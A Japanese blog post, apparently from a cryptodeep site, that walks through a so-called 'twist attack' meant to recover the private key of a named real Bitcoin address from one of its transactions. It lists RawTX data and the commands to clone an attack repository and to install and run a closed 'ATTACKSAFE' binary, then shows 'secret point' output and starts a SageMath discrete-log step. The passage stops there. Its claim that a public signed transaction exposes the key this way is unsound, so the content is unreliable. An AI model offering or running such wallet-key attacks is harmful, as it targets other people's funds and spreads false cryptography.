# ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。

<!-- wp:embed {"url":"https://www.youtube.com/embed/pOviZOYItv4","type":"rich","providerNameSlug":"вставить-обработчик","responsive":true,"className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed is-type-rich is-provider-вставить-обработчик wp-block-embed-вставить-обработчик wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/embed/pOviZOYItv4
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>この記事では、例 2 を使用してツイスト アタックを実装します。この記事の<a href="https://cryptodeeptech.ru/twist-attack" target="_blank" rel="noreferrer noopener">最初の理論的な部分に従って、</a>&nbsp;secp256k1 楕円曲線上の特定の点の助けを借りて、部分的な値を取得できることを確認しました秘密鍵を復元し、5 ～ 15 分以内に<a href="https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm_for_logarithms" target="_blank" rel="noreferrer noopener">「Sagemath pollard rho function : (discrete_log_rho)」</a>と<a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem" target="_blank" rel="noreferrer noopener">「中国剰余定理」</a>を使用してビットコイン ウォレットを復元します。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>これらの特定のポイントは、secp256k1 楕円曲線上の悪意を持って選択されたポイントであるため、一連の ECC 操作を続けましょう。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":2364,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-13-1024x596.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2364"/><figcaption class="wp-element-caption"><a href="https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md" target="_blank" rel="noreferrer noopener">https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Paulo Barreto のツイートによると:&nbsp;<a href="https://twitter.com/pbarreto/status/825703772382908416?s=21" target="_blank" rel="noreferrer noopener">https://twitter.com/pbarreto/status/825703772382908416?s=21</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2079} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-2-1024x706.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2079"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>余因子は 3^2*13^2*3319*22639 です</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":2082} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-3-1024x710.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2082"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>E1: 20412485227
E2: 3319, 22639
E3: 109903, 12977017, 383229727
E4: 18979
E6: 10903, 5290657, 10833080827, 22921299619447

prod = 20412485227 * 3319 * 22639 *109903 * 12977017 * 383229727 * 18979 * 10903 * 5290657 * 10833080827 * 22921299619447

38597363079105398474523661669562635951234135017402074565436668291433169282997 = 3 * 13^2 * 3319 * 22639 * 1013176677300131846900870239606035638738100997248092069256697437031

HEX:0x55555555555555555555555555555555C1C5B65DC59275416AB9E07B0FEDE7B5

</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/twist-attack/">ツイスト攻撃</a>を実行すると、「公開鍵」の特定の選択 (secp256k1 楕円曲線の選択点) によって「秘密鍵」を取得できます。つまり、トランザクションの値が明らかになります。その後、秘密鍵に関する情報も明らかになりますが、そのためにはいくつかの ECC 操作を実行する必要があります。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>E1: y^2 = x^3 + 1
E2: y^2 = x^3 + 2
E3: y^2 = x^3 + 3
E4: y^2 = x^3 + 4
E6: y^2 = x^3 + 6</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2086,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-4-1.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2086"/></a><figcaption class="wp-element-caption"><code><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">https://attacksafe.ru/twist-attack-on-bitcoin</a></code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>y² = x³ + ax + b. In the Koblitz curve,
y² = x³ + 0x + 7. In the Koblitz curve,
0  = x³ + 0  + 7
b '= -x ^ 3 - ax.</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>すべてのポイントは<code>(x, 0)&nbsp;</code>無効な曲線上にあり、&nbsp;<code>b '= -x ^ 3 - ax</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>実験的な部分に移りましょう:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><em>(ビットコインアドレスを考えてみましょう)</em></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx" target="_blank" rel="noreferrer noopener"><strong>1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>(ここで、重要で脆弱なトランザクションを検討してください)</em></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:embed {"url":"https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":2325} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-1-1024x196.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2325"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>を開きます&nbsp;。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener"><strong>18TwistAttack</strong></a>リポジトリを使用して<a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Twist Attack</strong></a>アルゴリズムを実装する<a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/18TwistAttack/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2108} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-6-1024x477.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2108"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>必要なすべてのパッケージをインストールします</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":687} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-11.png" alt="Frey-Rück 攻撃を実装して、秘密鍵「K」 (NONCE) を取得します。" class="wp-image-687"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><code>requirements.txt</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2113} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-7-1024x445.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2113"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2115} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-8-1024x440.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2115"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2116} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-9-1024x340.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2116"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-10-1024x452.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2117"/><figcaption class="wp-element-caption">、</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2118} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-11-1024x453.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2118"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>攻撃に備えて RawTX を準備する</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx" target="_blank" rel="noreferrer noopener"><strong>1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":2328} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-2-1024x286.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2328"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 01000000013edba424d1b614ec2182c8ac6856215afb803bcb9748c1888eecd35fffad67730e0000006b483045022100bbabd1cb2097e0053b3da453b15fd195a2bc1e8dbe00cfd60aee95b404d2abfa02201af66956a7ea158d32b0a56a46a83fe27f9e544387c8d0ce13cd2a54dba9a747012102912cd095d2c20e4fbdb20a8710971dd040a067dba45899b7156e9347efc20312ffffffff01a8020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>ファイルに保存: RawTX.txt</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":2369} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-14-1024x227.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2369"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong></strong>&nbsp;<strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">攻撃を実装するために、 「ATTACKSAFE SOFTWARE」</a></strong><strong>ソフトウェアを使用します</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":705,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-14.png" alt="Frey-Rück 攻撃を実装して、秘密鍵「K」 (NONCE) を取得します。" class="wp-image-705"/></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>アクセス権：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2134} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-14.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2134"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>応用：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -help</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2136} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-15.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2136"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -version</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2144} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-17.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2144"/><figcaption class="wp-element-caption"><code>Version 5.3.2. [ATTACKSAFE SOFTWARE, © 2023]</code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>"ATTACKSAFE SOFTWARE"</code>&nbsp;ビットコインに対するすべての一般的な攻撃が含まれています。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>すべての攻撃のリストを実行してみましょう:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -list</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2147} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-18.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2147"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2149} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-19.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2149"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2151} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-20.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2151"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2154} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-21.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2154"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>選びましょう<code>&nbsp;-tool: twist_attack</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>脆弱な ECDSA 署名トランザクションから特定の secp256k1 ポイントを取得するために、データを&nbsp;<code>RawTX</code>&nbsp;テキスト ドキュメントに追加し、ファイルとして保存しました。&nbsp;<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>01000000013edba424d1b614ec2182c8ac6856215afb803bcb9748c1888eecd35fffad67730e0000006b483045022100bbabd1cb2097e0053b3da453b15fd195a2bc1e8dbe00cfd60aee95b404d2abfa02201af66956a7ea158d32b0a56a46a83fe27f9e544387c8d0ce13cd2a54dba9a747012102912cd095d2c20e4fbdb20a8710971dd040a067dba45899b7156e9347efc20312ffffffff01a8020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool twist_attack</code>&nbsp;ソフトウェアを使用して&nbsp;起動する&nbsp;<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool twist_attack -open RawTX.txt -save SecretPoints.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2330} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-3-1024x304.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2330"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2332} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-4-1024x262.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2332"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>この攻撃は から開始され&nbsp;<code>-tool twist_attack</code>&nbsp;、結果はファイルに保存されました&nbsp;<code>SecretPoints.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>成功した結果を確認するには、ファイルを開きます&nbsp;<code>SecretPoints.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretPoints.txt</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>結果：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Elliptic Curve Secret Points:

Q11 = E1(&#91;97072073026593516785986136148833105674452542501015145216961054272876839453879, 107567253371779495307521678088935176637661904239924771700494716430774957820966])
Q21 = E2(&#91;3350296768277877304391506547616361976369787138559008027651808311357100316617, 72988900267653266243491077449097157591503403928437340215197819240911749073070])
Q22 = E2(&#91;112520741232779465095566100761481226712887911875949213866586208031790667764851, 67821409607391406974451792678186486803604797717916857589728259410989018828088])
Q31 = E3(&#91;19221018445349571002768878066568778104356611670224206148889744255553888839368, 51911948202474460182474729837629287426170495064721963100930541018009108314113])
Q32 = E3(&#91;41890177480111283990531243647299980511217563319657594412233172058507418746086, 50666391602993122126388747247624601309616370399604218474818855509093287774278])
Q33 = E3(&#91;42268931450354181048145324837791859216268206183479474730830244807012122440868, 106203099208900270966718494579849900683595613889332211248945862977592813439569])
Q41 = E4(&#91;54499795016623216633513895020095562919782606390420118477101689814601700532150, 105485166437855743326869509276555834707863666622073705127774354124823038313021])
Q61 = E6(&#91;62124953527279820718051689027867102514830975577976669973362563656149003510557, 100989088237897158673340534473118617341737987866593944452056172771683426720481])
Q62 = E6(&#91;86907281605062616221251901813989896824116536666883529138776205878798949076805, 19984923138198085750026187300638434023309806045826685297245727280111269894421])
Q63 = E6(&#91;66063410534588649374156935204077330523666149907425414249132071271750455781006, 25315648259518110320341360730017389015499807179224601293064633820188666088920])
Q64 = E6(&#91;109180854384525934106792159822888807664445139819154775748567618515646342974321, 102666617356998521143219293179463920284010473849613907153669896702897252016986])


RawTX = 01000000013edba424d1b614ec2182c8ac6856215afb803bcb9748c1888eecd35fffad67730e0000006b483045022100bbabd1cb2097e0053b3da453b15fd195a2bc1e8dbe00cfd60aee95b404d2abfa02201af66956a7ea158d32b0a56a46a83fe27f9e544387c8d0ce13cd2a54dba9a747012102912cd095d2c20e4fbdb20a8710971dd040a067dba45899b7156e9347efc20312ffffffff01a8020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000

</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>受信した secp256k1 ポイントを追加しましょう</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>これを行うには、<code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.pyを開きます</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2334} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/02/image-5-1024x371.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2334"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.py</strong></a>を実行するには、<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">SageMath</a></strong>をインストールします<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2188} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-27.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2188"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2189} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-28-1024x445.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2189"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>インストール コマンド:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt-get update
sudo apt-get install -y python3-gmpy2
yes '' | sudo env DEBIAN_FRONTEND=noninteractive apt-get -y -o DPkg::options::="--force-confdef" -o DPkg::options::="--force-confold" install sagemath</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2201} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-31-1024x422.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2201"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2202} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-32-1024x406.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2202"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2204} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-33-1024x401.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2204"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>コマンドで<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">SageMath</a></strong>のインストールを確認します:&nbsp;<a href="https://cryptodeep.ru/twist-attack/" target="_blank" rel="noreferrer noopener">sage -v</a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2208} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-34.png" alt="ツイスト攻撃の例 #2 一連の ECC 操作を続行して、ビットコイン ウォレットの秘密鍵の値を取得します。" class="wp-image-2208"/><figcaption class="wp-element-caption"><code>SageMath&nbsp;version&nbsp;9.0</code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>離散対数を解くには、<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py" target="_blank" rel="noreferrer noopener">discrete.py</a><em><code>(Pollard's rho algorithm for logarithms)</code></em>を実行します。<code>Python-script:</code><a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2210} -->
